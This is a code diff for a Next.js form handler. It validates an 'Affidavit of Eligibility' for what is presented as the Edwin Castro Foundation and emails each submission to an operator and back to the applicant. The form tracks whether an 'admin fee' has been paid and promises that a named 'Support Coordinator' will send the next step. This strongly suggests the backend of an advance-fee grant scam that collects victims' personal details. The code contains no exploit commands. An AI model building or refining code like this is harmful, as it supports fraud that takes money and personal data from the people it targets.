@@ -38,8 +38,10 @@ interface AffidavitPayload {
   electronicSignConfirm: boolean;
 }
 
-function validate(body: unknown): AffidavitPayload | null {
-  if (!body || typeof body !== 'object') return null;
+function validate(body: unknown): { payload: AffidavitPayload } | { error: string } {
+  if (!body || typeof body !== 'object') {
+    return { error: 'Please complete every field, sign electronically, and confirm the agreement box.' };
+  }
   const o = body as Record<string, unknown>;
   const payload: AffidavitPayload = {
     supportAmount: str(o.supportAmount),
@@ -54,36 +56,45 @@ function validate(body: unknown): AffidavitPayload | null {
     signature: str(o.signature),
     signDate: str(o.signDate),
     printName: str(o.printName),
-    electronicSignConfirm: o.electronicSignConfirm === true,
+    electronicSignConfirm: o.electronicSignConfirm === true || o.electronicSignConfirm === 'on' || o.electronicSignConfirm === 'true',
   };
 
-  const required = [
-    payload.supportAmount,
-    payload.applicationDate,
-    payload.fullName,
-    payload.addressStreet,
-    payload.addressCity,
-    payload.addressCountry,
-    payload.phone,
-    payload.email,
-    payload.signature,
-    payload.signDate,
-    payload.printName,
-  ];
+  const missing: string[] = [];
+  if (!payload.applicationDate) missing.push('application date');
+  if (!payload.fullName) missing.push('full name');
+  if (!payload.addressStreet) missing.push('street address');
+  if (!payload.addressCity) missing.push('city / state / postal code');
+  if (!payload.addressCountry) missing.push('country');
+  if (!payload.phone) missing.push('telephone');
+  if (!payload.email) missing.push('email');
+  if (!payload.signature) missing.push('electronic signature');
+  if (!payload.signDate) missing.push('date signed');
+  if (!payload.printName) missing.push('printed name');
+  if (!payload.electronicSignConfirm) missing.push('the confirmation checkbox at the bottom');
+  if (!payload.supportAmount) payload.supportAmount = 'To be confirmed';
 
-  if (required.some((v) => !v) || !payload.electronicSignConfirm) return null;
-  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payload.email)) return null;
-  return payload;
+  if (missing.length) {
+    return { error: `Please complete: ${missing.join(', ')}.` };
+  }
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payload.email)) {
+    return { error: 'Please enter a valid email address.' };
+  }
+  return { payload };
 }
 
 export async function POST(request: NextRequest) {
-  const parsed = validate(await request.json());
-  if (!parsed) {
-    return NextResponse.json(
-      { error: 'Please complete every field, sign electronically, and confirm the agreement box.' },
-      { status: 400 }
-    );
+  let body: unknown;
+  try {
+    body = await request.json();
+  } catch {
+    return NextResponse.json({ error: 'Could not read the form. Please try again.' }, { status: 400 });
   }
+
+  const parsed = validate(body);
+  if ('error' in parsed) {
+    return NextResponse.json({ error: parsed.error }, { status: 400 });
+  }
+  const { payload } = parsed;
 
   if (!zohoUser || !zohoPass) {
     return NextResponse.json({ error: 'Submission is temporarily unavailable. Please try again later.' }, { status: 500 });
@@ -99,18 +110,18 @@ export async function POST(request: NextRequest) {
   const operatorHtml = `
     <h2>Affidavit of Eligibility — Submitted Online</h2>
     <table style="border-collapse:collapse;font-size:14px;line-height:1.5;">
-      ${row('Support amount', parsed.supportAmount)}
-      ${row('Admin fee already paid', parsed.adminPaid ? 'Yes' : 'No')}
-      ${row('Application date', parsed.applicationDate)}
-      ${row('Full name', parsed.fullName)}
-      ${row('Street', parsed.addressStreet)}
-      ${row('City / State / Postal', parsed.addressCity)}
-      ${row('Country', parsed.addressCountry)}
-      ${row('Phone', parsed.phone)}
-      ${row('Email', parsed.email)}
-      ${row('Electronic signature', parsed.signature)}
-      ${row('Date signed', parsed.signDate)}
-      ${row('Printed name', parsed.printName)}
+      ${row('Support amount', payload.supportAmount)}
+      ${row('Admin fee already paid', payload.adminPaid ? 'Yes' : 'No')}
+      ${row('Application date', payload.applicationDate)}
+      ${row('Full name', payload.fullName)}
+      ${row('Street', payload.addressStreet)}
+      ${row('City / State / Postal', payload.addressCity)}
+      ${row('Country', payload.addressCountry)}
+      ${row('Phone', payload.phone)}
+      ${row('Email', payload.email)}
+      ${row('Electronic signature', payload.signature)}
+      ${row('Date signed', payload.signDate)}
+      ${row('Printed name', payload.printName)}
     </table>
     <p style="margin-top:16px;color:#666;font-size:12px;">Submitted via https://www.edwinmega.com/documents/affidavit-of-eligibility.html</p>
   `;
@@ -119,27 +130,27 @@ export async function POST(request: NextRequest) {
     await transporter.sendMail({
       from: zohoUser,
       to: toEmail || zohoUser,
-      replyTo: parsed.email,
-      subject: `[Affidavit] ${parsed.fullName} — ${parsed.supportAmount}`,
-      text: `Affidavit submitted — ${parsed.fullName}\nEmail: ${parsed.email}\nAmount: ${parsed.supportAmount}\nAdmin paid: ${parsed.adminPaid ? 'Yes' : 'No'}\nSignature: ${parsed.signature}`,
+      replyTo: payload.email,
+      subject: `[Affidavit] ${payload.fullName} — ${payload.supportAmount}`,
+      text: `Affidavit submitted — ${payload.fullName}\nEmail: ${payload.email}\nAmount: ${payload.supportAmount}\nAdmin paid: ${payload.adminPaid ? 'Yes' : 'No'}\nSignature: ${payload.signature}`,
       html: operatorHtml,
     });
 
     await transporter.sendMail({
       from: `"Michael Freedman, Edwin Castro Foundation" <${zohoUser}>`,
-      to: parsed.email,
+      to: payload.email,
       replyTo: toEmail || zohoUser,
       subject: 'Affidavit received — Edwin Castro Foundation',
       html: `
-        <p>Dear ${escapeHtml(parsed.fullName)},</p>
+        <p>Dear ${escapeHtml(payload.fullName)},</p>
         <p>We have received your Affidavit of Eligibility and Release for the Edwin Castro Foundation.</p>
-        <p>Support amount on file: <strong>${escapeHtml(parsed.supportAmount)}</strong><br/>
-        Date signed: <strong>${escapeHtml(parsed.signDate)}</strong></p>
+        <p>Support amount on file: <strong>${escapeHtml(payload.supportAmount)}</strong><br/>
+        Date signed: <strong>${escapeHtml(payload.signDate)}</strong></p>
         <p>Your affidavit is now with our office for review. Michael Freedman, your Support Coordinator, will email you with the next step.</p>
         <p>This confirmation is not a final funding release.</p>
         <p>Michael Freedman<br/>Support Coordinator<br/>Edwin Castro Foundation<br/>${escapeHtml(toEmail || zohoUser || '')}</p>
       `,
-      text: `Dear ${parsed.fullName},\n\nWe have received your Affidavit of Eligibility and Release for ${parsed.supportAmount}. Michael Freedman will email you with the next step.\n\nEdwin Castro Foundation`,
+      text: `Dear ${payload.fullName},\n\nWe have received your Affidavit of Eligibility and Release for ${payload.supportAmount}. Michael Freedman will email you with the next step.\n\nEdwin Castro Foundation`,
     });
 
     return NextResponse.json({ ok: true });
